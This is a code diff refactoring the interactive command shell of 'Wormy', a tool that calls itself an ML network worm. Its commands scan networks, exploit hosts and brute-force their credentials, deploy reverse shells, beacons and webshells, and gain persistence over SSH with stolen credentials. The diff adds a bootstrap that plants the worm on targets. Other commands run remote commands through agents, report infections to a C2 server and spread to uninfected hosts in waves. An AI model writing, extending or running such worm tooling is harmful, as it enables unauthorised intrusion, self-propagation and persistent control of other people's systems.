@@ -1,30 +1,31 @@
 """
-Wormy ML Network Worm v4.2 — Modern Interactive CLI
+Wormy — interactive REPL (``wormy shell``).
+
+Live status banner, scan/exploit/persist commands, and reporting.
+Extracted from the former root-level ``cli.py`` so it ships inside the
+installed package.
 """
 
 import cmd
-import hashlib
 import os
+import shutil
 import sys
+import tempfile
 import time
 from datetime import datetime
-from typing import Optional
 
 from rich.console import Console
-from rich.layout import Layout
-from rich.live import Live
 from rich.panel import Panel
-from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeElapsedColumn
 from rich.table import Table
-from rich.text import Text
 
+from ._version import __version__
 from utils.logger import logger
 
 console = Console()
 
 
-class WormyCLI(cmd.Cmd):
-    """Modern interactive CLI for Wormy with Rich TUI"""
+class InteractiveCLI(cmd.Cmd):
+    """Interactive command shell for a live WormCore instance."""
 
     prompt = ""
     use_rawinput = False
@@ -35,6 +36,8 @@ class WormyCLI(cmd.Cmd):
         self._start_time = time.time()
         self._cmd_count = 0
         self._update_prompt()
+
+    # ── helpers ──────────────────────────────────────────────────────
 
     def _update_prompt(self):
         infected = len(self.worm.infected_hosts) if hasattr(self.worm, "infected_hosts") else 0
@@ -67,7 +70,7 @@ class WormyCLI(cmd.Cmd):
         status_style = "green" if getattr(self.worm, "running", False) else "yellow"
         return Panel(
             t,
-            title=f"[bold]Wormy[/] [dim]v4.0[/]  [{status_style}]{status}[/]",
+            title=f"[bold]Wormy[/] [dim]v{__version__}[/]  [{status_style}]{status}[/]",
             border_style="bright_blue",
             padding=(0, 1),
         )
@@ -75,7 +78,17 @@ class WormyCLI(cmd.Cmd):
     def _print_banner(self):
         console.print(self._banner())
 
-    # ── SCAN ──────────────────────────────────────────────────────────────
+    def _find_target(self, ip: str):
+        return next((h for h in self.worm.scan_results if h["ip"] == ip), None)
+
+    def _first_credential(self):
+        if self.worm.cred_manager:
+            creds = self.worm.cred_manager.get_discovered_credentials()
+            if creds:
+                return creds[0]
+        return "root", ""
+
+    # ── SCAN ─────────────────────────────────────────────────────────
 
     def do_scan(self, arg):
         """Scan the network. Usage: scan [professional|basic]"""
@@ -117,16 +130,12 @@ class WormyCLI(cmd.Cmd):
         console.print(t)
         self._update_prompt()
 
-    do_s = do_scan
-
-    # ── STATUS ────────────────────────────────────────────────────────────
+    # ── STATUS / TARGETS ─────────────────────────────────────────────
 
     def do_status(self, arg):
         """Show current status"""
         self._print_banner()
         self.worm.print_status()
-
-    # ── TARGETS ───────────────────────────────────────────────────────────
 
     def do_targets(self, arg):
         """List discovered targets"""
@@ -148,9 +157,7 @@ class WormyCLI(cmd.Cmd):
         console.print(t)
         self._update_prompt()
 
-    do_t = do_targets
-
-    # ── EXPLOIT ───────────────────────────────────────────────────────────
+    # ── EXPLOIT ──────────────────────────────────────────────────────
 
     def do_exploit(self, arg):
         """Exploit a target. Usage: exploit <ip>"""
@@ -158,18 +165,16 @@ class WormyCLI(cmd.Cmd):
         if not ip:
             console.print("[red]Usage: exploit <ip>[/]")
             return
-        target = next((h for h in self.worm.scan_results if h["ip"] == ip), None)
+        target = self._find_target(ip)
         if not target:
             console.print(f"[red]Target {ip} not found[/]")
             return
         with console.status(f"[bold cyan]Exploiting {ip}...", spinner="dots"):
             success = self.worm.exploit_target(target)
-        console.print(f"[green]Exploit succeeded[/]" if success else f"[red]Exploit failed[/]")
+        console.print("[green]Exploit succeeded[/]" if success else "[red]Exploit failed[/]")
         self._update_prompt()
 
-    do_x = do_exploit
-
-    # ── VULNS ─────────────────────────────────────────────────────────────
+    # ── VULNS ────────────────────────────────────────────────────────
 
     def do_vulns(self, arg):
         """Show vulnerabilities. Usage: vulns <ip>"""
@@ -196,9 +201,7 @@ class WormyCLI(cmd.Cmd):
                 return
         console.print(f"[red]Target {ip} not found[/]")
 
-    do_v = do_vulns
-
-    # ── CHAIN ─────────────────────────────────────────────────────────────
+    # ── CHAIN ────────────────────────────────────────────────────────
 
     def do_chain(self, arg):
         """Show exploit chain. Usage: chain <ip>"""
@@ -223,7 +226,7 @@ class WormyCLI(cmd.Cmd):
                 return
         console.print(f"[red]Target {ip} not found[/]")
 
-    # ── CREDS ─────────────────────────────────────────────────────────────
+    # ── CREDS ────────────────────────────────────────────────────────
 
     def do_creds(self, arg):
         """Show discovered credentials"""
@@ -241,9 +244,7 @@ class WormyCLI(cmd.Cmd):
             t.add_row(u, p)
         console.print(t)
 
-    do_c = do_creds
-
-    # ── MONITOR ───────────────────────────────────────────────────────────
+    # ── MONITOR ──────────────────────────────────────────────────────
 
     def do_monitor(self, arg):
         """Show host monitoring dashboard"""
@@ -254,7 +255,7 @@ class WormyCLI(cmd.Cmd):
 
     do_hosts = do_monitor
 
-    # ── EVASION ───────────────────────────────────────────────────────────
+    # ── EVASION ──────────────────────────────────────────────────────
 
     def do_evasion(self, arg):
         """Show evasion status"""
@@ -273,17 +274,16 @@ class WormyCLI(cmd.Cmd):
                 t.add_row("Polymorphic", k.replace("_", " ").title(), str(v))
         console.print(t)
 
-    # ── BRUTEFORCE ────────────────────────────────────────────────────────
+    # ── BRUTEFORCE ───────────────────────────────────────────────────
 
     def do_bruteforce(self, arg):
         """Brute force a target. Usage: bruteforce <ip> [service]"""
         parts = arg.strip().split()
         if not parts:
-            console.print("[red]Usage: bruteforce <ip> [service][/]"
-            )
+            console.print("[red]Usage: bruteforce <ip> [service][/]")
             return
         ip = parts[0]
-        target = next((h for h in self.worm.scan_results if h["ip"] == ip), None)
+        target = self._find_target(ip)
         if not target:
             console.print(f"[red]Target {ip} not found[/]")
             return
@@ -304,15 +304,19 @@ class WormyCLI(cmd.Cmd):
             console.print(f"[red]Brute force failed on {ip}[/]")
         self._update_prompt()
 
-    # ── GRAPH / TOPO ──────────────────────────────────────────────────────
+    # ── GRAPH / TOPO ─────────────────────────────────────────────────
 
     def do_graph(self, arg):
         """Generate network topology visualization"""
         if not self.worm.host_monitor:
             console.print("[dim]Host Monitor unavailable[/]")
             return
-        hosts = {h["ip"]: {"os_guess": h.get("os_guess", "?"), "open_ports": h.get("open_ports", [])} for h in self.worm.scan_results}
+        hosts = {
+            h["ip"]: {"os_guess": h.get("os_guess", "?"), "open_ports": h.get("open_ports", [])}
+            for h in self.worm.scan_results
+        }
         from utils.topology_visualizer import TopologyVisualizer
+
         tv = TopologyVisualizer()
         lateral = []
         for ip in self.worm.host_monitor.hosts:
@@ -328,7 +332,7 @@ class WormyCLI(cmd.Cmd):
 
     do_topo = do_graph
 
-    # ── HOST ──────────────────────────────────────────────────────────────
+    # ── HOST ─────────────────────────────────────────────────────────
 
     def do_host(self, arg):
         """Show host details. Usage: host <ip>"""
@@ -349,7 +353,7 @@ class WormyCLI(cmd.Cmd):
 
     do_h = do_host
 
-    # ── ACTIVITY ──────────────────────────────────────────────────────────
+    # ── ACTIVITY ─────────────────────────────────────────────────────
 
     def do_activity(self, arg):
         """Show recent activity. Usage: activity [limit]"""
@@ -373,7 +377,7 @@ class WormyCLI(cmd.Cmd):
             t.add_row(a["timestamp"][11:19], a["host_ip"], a["type"], str(a.get("details", ""))[:50])
         console.print(t)
 
-    # ── PIVOT ─────────────────────────────────────────────────────────────
+    # ── PIVOT ────────────────────────────────────────────────────────
 
     def do_pivot(self, arg):
         """Show lateral movement options. Usage: pivot <source_ip>"""
@@ -385,30 +389,25 @@ class WormyCLI(cmd.Cmd):
             reachable = self.worm.knowledge_graph.get_reachable_from(ip)
             console.print(f"[bold]Reachable from {ip}:[/] {reachable}")
 
-    # ── DEPLOY ────────────────────────────────────────────────────────────
+    # ── DEPLOY ───────────────────────────────────────────────────────
 
     def do_deploy(self, arg):
         """Deploy payload. Usage: deploy <ip> [reverse_shell|beacon|webshell]"""
         parts = arg.strip().split()
         if not parts:
-            console.print("[red]Usage: deploy <ip> [type][/]"
-            )
+            console.print("[red]Usage: deploy <ip> [type][/]")
             return
         ip = parts[0]
         ptype = parts[1] if len(parts) > 1 else "beacon"
         if not self.worm.payload_deployer:
             console.print("[dim]Payload Deployer unavailable[/]")
             return
-        target = next((h for h in self.worm.scan_results if h["ip"] == ip), None)
+        target = self._find_target(ip)
         if not target:
             console.print(f"[red]Target {ip} not found[/]")
             return
         ports = target.get("open_ports", [])
-        username, password = "root", ""
-        if self.worm.cred_manager:
-            creds = self.worm.cred_manager.get_discovered_credentials()
-            if creds:
-                username, password = creds[0]
+        username, password = self._first_credential()
         success = False
         ssh_ports = (22, 2222, 2200, 2022, 8022)
         for port in ports:
@@ -427,25 +426,41 @@ class WormyCLI(cmd.Cmd):
         console.print(f"[green]Deploy succeeded on {ip}[/]" if success else f"[red]Deploy failed on {ip}[/]")
         self._update_prompt()
 
-    # ── PERSIST ───────────────────────────────────────────────────────────
+    # ── PERSIST ──────────────────────────────────────────────────────
+
+    def _resolve_payload_path(self) -> str:
+        """Locate a sensible payload file to persist on a target.
+
+        Preference order: the ``wormy`` launcher at the project root, the
+        ``wormy`` binary on PATH, or a generated bootstrap script that
+        runs ``python -m worm_core`` (the package itself is not a single
+        copyable file anymore).
+        """
+        repo_root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
+        candidates = [os.path.join(repo_root, "wormy"), shutil.which("wormy")]
+        for c in candidates:
+            if c and os.path.isfile(c):
+                return c
+        bootstrap = os.path.join(tempfile.gettempdir(), "wormy_bootstrap.py")
+        if not os.path.exists(bootstrap):
+            with open(bootstrap, "w", encoding="utf-8") as fh:
+                fh.write("#!/usr/bin/env python3\n")
+                fh.write("# Bootstrap generated by wormy shell - launches the worm engine.\n")
+                fh.write("import sys\n\nfrom worm_core.cli import main\n\nsys.exit(main())\n")
+        return bootstrap
 
     def do_persist(self, arg):
         """Establish persistence. Usage: persist <ip> [methods]"""
         parts = arg.strip().split()
         if not parts:
-            console.print("[red]Usage: persist <ip> [methods][/]"
-            )
+            console.print("[red]Usage: persist <ip> [methods][/]")
             return
         ip = parts[0]
         if not self.worm.remote_persistence:
             console.print("[dim]Remote Persistence unavailable[/]")
             return
-        target = next((h for h in self.worm.scan_results if h["ip"] == ip), None)
-        username, password = "root", ""
-        if self.worm.cred_manager:
-            creds = self.worm.cred_manager.get_discovered_credentials()
-            if creds:
-                username, password = creds[0]
+        target = self._find_target(ip)
+        username, password = self._first_credential()
         ssh_ports = (22, 2222, 2200, 2022, 8022)
         ssh_port = 22
         if target:
@@ -453,7 +468,7 @@ class WormyCLI(cmd.Cmd):
                 if p in ssh_ports:
                     ssh_port = p
                     break
-        worm_path = os.path.abspath(os.path.join(os.path.dirname(__file__), "worm_core.py"))
+        worm_path = self._resolve_payload_path()
         results = self.worm.remote_persistence.establish(
             ip=ip,
             os_type=target.get("os_guess", "Unknown") if target else "Unknown",
@@ -469,7 +484,7 @@ class WormyCLI(cmd.Cmd):
             console.print(f"[red]Persistence failed on {ip}[/]")
         self._update_prompt()
 
-    # ── EXEC ──────────────────────────────────────────────────────────────
+    # ── EXEC ─────────────────────────────────────────────────────────
 
     def do_exec(self, arg):
         """Execute command. Usage: exec <ip> <command>"""
@@ -491,12 +506,12 @@ class WormyCLI(cmd.Cmd):
             rc, output = self.worm.agent_controller.execute_now(agent.agent_id, command)
             console.print(f"[bold]Output from {ip}[/] (agent={agent.agent_id}, user={agent.username}, rc={rc})")
             console.print(output if output else "[dim](no output)[/]")
-        except Exception as e:
+        except Exception as e:  # noqa: BLE001 — user-facing command error
             console.print(f"[red]Command failed: {e}[/]")
 
     do_e = do_exec
 
-    # ── RUN ───────────────────────────────────────────────────────────────
+    # ── RUN ──────────────────────────────────────────────────────────
 
     def do_run(self, arg):
         """Start propagation. Usage: run [iterations]"""
@@ -509,7 +524,8 @@ class WormyCLI(cmd.Cmd):
         self.worm.start_time = datetime.now()
         self.worm.stats["start_time"] = self.worm.start_time
 
-        from worm_core import get_local_ip
+        from .standalone import get_local_ip
+
         local_ip = get_local_ip()
         self.worm._safe_add_infected(local_ip)
         if self.worm.knowledge_graph:
@@ -551,7 +567,7 @@ class WormyCLI(cmd.Cmd):
                         console.print("[green]OTA Brain Update applied[/]")
                         self.worm.c2_server.pending_brain_update = None
                         os.remove(update_path)
-                except Exception as e:
+                except Exception as e:  # noqa: BLE001 — optional OTA path
                     logger.debug(f"OTA update failed: {e}")
 
             if self.worm.distributed_redundancy and iteration % 10 == 0:
@@ -570,21 +586,24 @@ class WormyCLI(cmd.Cmd):
 
             if self.worm.c2_server and target["ip"] in self.worm.infected_hosts:
                 try:
-                    self.worm.c2_server.process_beacon({
-                        "host_id": target["ip"],
-                        "ip": target["ip"],
-                        "hostname": target.get("hostname", "unknown"),
-                        "os": target.get("os_guess", "Unknown"),
-                        "ports": target.get("open_ports", []),
-                        "beacon_type": "infection",
-                    })
-                except Exception:
+                    self.worm.c2_server.process_beacon(
+                        {
+                            "host_id": target["ip"],
+                            "ip": target["ip"],
+                            "hostname": target.get("hostname", "unknown"),
+                            "os": target.get("os_guess", "Unknown"),
+                            "ports": target.get("open_ports", []),
+                            "beacon_type": "infection",
+                        }
+                    )
+                except Exception:  # noqa: BLE001 — beacon reporting is best-effort
                     pass
 
             if self.worm.wave_propagation and iteration % 3 == 0 and len(self.worm.infected_hosts) > 1:
                 try:
                     targets = [
-                        h for h in self.worm.scan_results
+                        h
+                        for h in self.worm.scan_results
                         if h["ip"] not in self.worm.infected_hosts and h["ip"] not in self.worm.failed_targets
                     ]
                     if targets and self.worm.cred_manager:
@@ -596,13 +615,13 @@ class WormyCLI(cmd.Cmd):
                                 exploit_fn=self.worm.exploit_target,
                                 wave=iteration // 3,
                             )
-                except Exception:
+                except Exception:  # noqa: BLE001 — wave propagation is best-effort
                     pass
 
             if self.worm.agent_controller and iteration % 2 == 0:
                 try:
                     self.worm.agent_controller.heartbeat_check()
-                except Exception:
+                except Exception:  # noqa: BLE001 — heartbeat is best-effort
                     pass
 
             if self.worm.config.propagation.propagation_delay > 0:
@@ -620,20 +639,18 @@ class WormyCLI(cmd.Cmd):
 
     do_r = do_run
 
-    # ── STOP ──────────────────────────────────────────────────────────────
+    # ── STOP / REPORT ────────────────────────────────────────────────
 
     def do_stop(self, arg):
         """Stop propagation"""
         self.worm.stop()
         console.print("[yellow]Propagation stopped[/]")
 
-    # ── REPORT ────────────────────────────────────────────────────────────
-
     def do_report(self, arg):
         """Generate audit report"""
         self.worm.print_final_report()
 
-    # ── TRAIN ─────────────────────────────────────────────────────────────
+    # ── TRAIN ────────────────────────────────────────────────────────
 
     def do_train(self, arg):
         """Train ML models. Usage: train [rl|classifier|evasion|all]"""
@@ -645,36 +662,39 @@ class WormyCLI(cmd.Cmd):
             console.print("\n[cyan]Training Host Classifier...[/]")
             try:
                 from ml_models.train_host_classifier import main as train_classifier
+
                 train_classifier()
                 trained.append("Host Classifier")
-            except Exception as e:
+            except Exception as e:  # noqa: BLE001 — report and continue
                 console.print(f"[red]Failed: {e}[/]")
 
         if model in ("evasion", "all"):
             console.print("\n[cyan]Training Evasion Model...[/]")
             try:
                 from ml_models.train_evasion_model import main as train_evasion
+
                 train_evasion()
                 trained.append("Evasion Model")
-            except Exception as e:
+            except Exception as e:  # noqa: BLE001 — report and continue
                 console.print(f"[red]Failed: {e}[/]")
 
         if model in ("rl", "all"):
             console.print("\n[cyan]Training RL Agent...[/]")
             try:
                 from ml_models.train_rl_agent import train_agent_curriculum
+
                 train_agent_curriculum()
                 trained.append("RL Agent")
-            except Exception as e:
+            except Exception as e:  # noqa: BLE001 — report and continue
                 console.print(f"[red]Failed: {e}[/]")
 
         if trained:
             console.print(f"\n[green]Trained: {', '.join(trained)}[/]")
         else:
-            console.print("[yellow]No models trained. Usage: train [rl|classifier|evasion|all][/]"
-            )
+            console.print("[yellow]No models trained. Usage: train [rl|classifier|evasion|all][/]")
+            logger.warning("No models trained")
 
-    # ── HELP ──────────────────────────────────────────────────────────────
+    # ── HELP / EXIT ──────────────────────────────────────────────────
 
     def do_help(self, arg):
         """Show help"""
@@ -689,8 +709,8 @@ class WormyCLI(cmd.Cmd):
             ("exploit <ip>", "Exploit a target"),
             ("bruteforce <ip>", "Brute force credentials"),
             ("deploy <ip> [type]", "Deploy payload"),
-            ("persist <ip>", "Establish persistence"),
-            ("exec <ip> <cmd>", "Execute command"),
+            ("persist <ip> [methods]", "Establish persistence"),
+            ("exec <ip> <cmd>", "Execute command via agent"),
             ("status", "Show current status"),
             ("hosts", "Host monitoring dashboard"),
             ("host <ip>", "Host details"),
@@ -703,13 +723,16 @@ class WormyCLI(cmd.Cmd):
             ("stop", "Stop propagation"),
             ("train [model]", "Train ML models"),
             ("report", "Audit report"),
+            ("version", "Show version"),
             ("exit", "Exit CLI"),
         ]
-        for cmd, desc in commands:
-            t.add_row(cmd, desc)
+        for cmd_name, desc in commands:
+            t.add_row(cmd_name, desc)
         console.print(t)
 
-    # ── EXIT ──────────────────────────────────────────────────────────────
+    def do_version(self, arg):
+        """Show version information"""
+        console.print(f"[bold]Wormy[/] v{__version__} (python {sys.version.split()[0]})")
 
     def do_exit(self, arg):
         """Exit the CLI"""
@@ -720,18 +743,15 @@ class WormyCLI(cmd.Cmd):
     do_quit = do_exit
     do_q = do_exit
 
-    # ── ALIASES ───────────────────────────────────────────────────────────
+    # ── SHORT ALIASES ────────────────────────────────────────────────
 
     do_s = do_scan
     do_x = do_exploit
-    do_r = do_run
     do_t = do_targets
     do_c = do_creds
-    do_h = do_host
     do_v = do_vulns
-    do_e = do_exec
 
-    # ── CMD LOOP HOOKS ────────────────────────────────────────────────────
+    # ── CMD LOOP HOOKS ───────────────────────────────────────────────
 
     def precmd(self, line):
         self._cmd_count += 1
@@ -747,4 +767,5 @@ class WormyCLI(cmd.Cmd):
 
 
 # Backwards compatibility alias
-InteractiveCLI = WormyCLI
+WormyCLI = InteractiveCLI
+
